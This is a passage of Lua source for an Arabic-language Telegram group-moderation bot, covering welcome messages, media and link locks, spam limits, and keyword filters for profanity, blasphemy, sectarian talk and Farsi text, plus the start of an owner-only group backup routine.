DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
if DevFeras:get(DevFeras..'welcome:'..msg.chat_id_) then
text = DevFeras:get(DevFeras..'welcome:'..msg.chat_id_)
else
text = '• نورت حبي \n• [firstname lastname] \n• [@username]'
end
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
local text = text:gsub('username',(result.username_ or 'Dev_Prox'))
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if DevFeras:get(DevFeras.."bot:welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source DevFeras     --
--      New User Add      --
elseif msg_type == 'MSG:NewUserAdd' then
if DevFeras:get(DevFeras..'bot:tgservice:jk'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
if DevFeras:get(DevFeras.."bot:welcome"..msg.chat_id_) then
if DevFeras:get(DevFeras..'welcome:'..msg.chat_id_) then
text = DevFeras:get(DevFeras..'welcome:'..msg.chat_id_)
else
text = '• نورت حبي \n• [firstname lastname] \n• [@username]'
end
local text = text:gsub('firstname',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('lastname',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('username',(msg.content_.members_[0].username_ or 'Dev_Prox'))
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source DevFeras     --
--        Contact         --
elseif msg_type == 'MSG:Contact' then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
if msg.forward_info_ then
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Contact]")
end
end
end
if DevFeras:get(DevFeras..'bot:contact:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Contact]")
end
end
--     Source DevFeras     --
--         Audio          --
elseif msg_type == 'MSG:Audio' then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
if msg.forward_info_ then
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Audio]")
end
end
end
if DevFeras:get(DevFeras..'bot:music:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Audio]")
end
end
if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Audio]")
end
end
if msg.content_.caption_:match("#") then
if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Audio]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Audio]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Audio]")
end
end
end
end
--     Source DevFeras     --
--         Voice          --
elseif msg_type == 'MSG:Voice' then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
if msg.forward_info_ then
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Voice]")
end
end
end
if DevFeras:get(DevFeras..'bot:voice:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Voice]")
end
end
if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Voice]")
end
end
if msg.content_.caption_:match("#") then
if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Voice]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Voice]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Voice]")
end
end
end
end
--     Source DevFeras     --
--        Location        --
elseif msg_type == 'MSG:Location' then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
if msg.forward_info_ then
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Location]")
end
end
end
if DevFeras:get(DevFeras..'bot:location:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Location]")
end
end
if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Location]")
end
end
if msg.content_.caption_:match("#") then
if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Location]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Location]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Location]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Location]")
end
end
end
end
--     Source DevFeras     --
--         Video          --
elseif msg_type == 'MSG:Video' then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
if msg.forward_info_ then
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Video]")
end
end
end
if DevFeras:get(DevFeras..'bot:video:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Video]")
end
end
if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Video]")
end
end
if msg.content_.caption_:match("#") then
if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Video]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Video] ")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Video] ")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Video]")
end
end
end
end
--     Source DevFeras     --
--          Gif           --
elseif msg_type == 'MSG:Gif' then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
if msg.forward_info_ then
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Gif]")
end
end
end
if DevFeras:get(DevFeras..'bot:gifs:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Gif] ")
end
end
if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Gif]")
end
end
if msg.content_.caption_:match("#") then
if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Gif]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Gif]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Gif]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Gif]")
end
end
end
end
--     Source DevFeras     --
--         Text           --
elseif msg_type == 'MSG:Text' then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
Filters(msg,text)
if msg.forward_info_ then
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Text]")
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link]")
end
end
if DevFeras:get(DevFeras..'bot:text:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Text]")
end
if msg.content_.text_:match("@") then
if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Text]")
end
end
if msg.content_.text_:match("#") then
if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Text]")
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Text]")
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Text]")
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local abs = 'bot:sens:spam'..msg.chat_id_
if not DevFeras:get(DevFeras..abs) then
sens = 400
else
sens = tonumber(DevFeras:get(DevFeras..abs))
end
if DevFeras:get(DevFeras..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Spam] ")
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Text]")
end
end
end
--     Source DevFeras     --
if DevFeras:get(DevFeras.."bot:group:link"..msg.chat_id_) == 'waiting' then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local abs = "bot:group:link"..msg.chat_id_
DevFeras:set(DevFeras..abs,glink)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم صنع الرابط الجديد\n⌁︙ارسل (الرابط) لعرض الرابط', 1, 'md')
end
end
DevFeras:set(DevFeras..'bot:editid'.. msg.id_,msg.content_.text_)
--     Source DevFeras     --
local msg = data.message_
text = msg.content_.text_
if text and MonshId(msg.sender_user_id_, msg.chat_id_) then 
if DevFeras:get('Feras_dev:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevFeras:del('Feras_dev:'..bot_id..'id:user'..msg.chat_id_)  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
DevFeras:del('Feras_dev:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevFeras:del('Feras_dev:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevFeras:get('Feras_dev:'..bot_id..'id:user'..msg.chat_id_)  
DevFeras:incrby(DevFeras..'user:msgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Feras(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' رساله', 1, 'md')
end
end
if text and MonshId(msg.sender_user_id_, msg.chat_id_) then 
if DevFeras:get('Feras_dev:'..bot_id.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevFeras:del('Feras_dev:'..bot_id..'ids:user'..msg.chat_id_)  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
DevFeras:del('Feras_dev:'..bot_id.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevFeras:del('Feras_dev:'..bot_id.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevFeras:get('Feras_dev:'..bot_id..'ids:user'..msg.chat_id_)  
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..iduserr,numadded)  
Dev_Feras(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' نقطه', 1, 'md')
end
end
--     Source DevFeras     --
if text:match("طيز") or text:match("ديس") or text:match("انيك امك") or text:match("انيك") or text:match("نيك") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("قحبه") or text:match("قحاب") or text:match("اخو القحبه") or text:match("اخ القحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") then
if not DevFeras:get(DevFeras.."fshar"..msg.chat_id_) and not Admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
text = '⌁︙عذرا عزيزي ↫ [firstname](https://telegram.me/username) \n⌁︙ممنوع الفشار في المجموعه'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'Dev_Prox'))
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source DevFeras     --
if text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") then
if DevFeras:get(DevFeras.."farsi"..msg.chat_id_) and not Admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
text = '⌁︙عذرا عزيزي ↫ [firstname](https://telegram.me/username) \n⌁︙ممنوع التكلم بالغه الفارسيه هنا'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'Dev_Prox'))
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
if text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") then
if DevFeras:get(DevFeras.."farsiban"..msg.chat_id_) and not Admin(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
--     Source DevFeras     --
if text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله") then
if not DevFeras:get(DevFeras.."kaf"..msg.chat_id_) and not Admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
text = '⌁︙عذرا عزيزي ↫ [firstname](https://telegram.me/username) \n⌁︙الرجاء عدم قول هذه الالفاظ البذيئه وتذكر ان الله سيعاقبك'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'Dev_Prox'))
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source DevFeras     --
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("طائفيه") or text:match("انا سني") or text:match("انا شيعي") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("بالشيعه") or text:match("شيعة") then
if not DevFeras:get(DevFeras.."taf"..msg.chat_id_) and not Admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
text = '⌁︙عذرا عزيزي ↫ [firstname](https://telegram.me/username) \n⌁︙ممنوع التكلم بالطائفيه هنا'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'Dev_Prox'))
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source DevFeras     --
if Sudo(msg) then
if text == 'جلب نسخه القروبات' and SourceCh(msg) or text == 'جلب نسخه احتياطيه' and SourceCh(msg) then
local list = DevFeras:smembers(DevFeras..'bot:groups')  
local GetJson = '{"BotId": '..DevFeras..',"GroupsList":{'  
for k,v in pairs(list) do 
LinkGroups = DevFeras:get(DevFeras.."bot:group:link"..v)
Welcomes = DevFeras:get(DevFeras..'welcome:'..v) or ''
AbsMonshs = DevFeras:smembers(DevFeras..'abs:absmonsh:'..v)
Monshs = DevFeras:smembers(DevFeras..'abs:monsh:'..v)
MonshIds = DevFeras:smembers(DevFeras..'abs:monshid:'..v)
Owners = DevFeras:smembers(DevFeras..'abs:owners:'..v)
Admis = DevFeras:smembers(DevFeras..'abs:admins:'..v)
Vips = DevFeras:smembers(DevFeras..'abs:vipmem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Owners ~= 0 then
GetJson = GetJson..'"Owners":['
for k,v in pairs(Owners) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #MonshIds ~= 0 then
GetJson = GetJson..'"MonshIds":['
for k,v in pairs(MonshIds) do
if k == 1 then
